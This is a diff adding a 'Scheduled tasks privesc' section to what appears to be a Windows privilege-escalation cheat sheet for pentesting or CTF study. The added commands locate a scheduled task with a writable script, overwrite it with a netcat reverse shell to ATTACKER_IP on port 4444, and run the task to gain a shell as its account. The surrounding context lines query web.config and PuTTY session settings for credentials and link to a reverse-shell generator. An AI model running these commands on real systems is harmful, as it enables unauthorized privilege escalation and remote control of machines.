@@ -102,6 +102,15 @@ type C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config | findstr
 ```reg query HKEY_CURRENT_USER\Software\SimonTatham\PuTTY\Sessions\ /f "Proxy" /s```
 	
 	
+* ### Scheduled tasks privesc
+```
+schtasks /query /tn vulntask /fo list /v <= see the executer account and the file executed
+icacls c:\tasks\schtask.bat <== check the file executed permessions if writable
+echo c:\tools\nc64.exe -e cmd.exe ATTACKER_IP 4444 > C:\tasks\schtask.bat <== add payload to the executed file
+schtasks /run /tn vulntask <== run the task to get reverse shell with executer's account
+```
+
+* ### 
 # Reverse Shell
 ***
 * ### https://www.revshells.com/
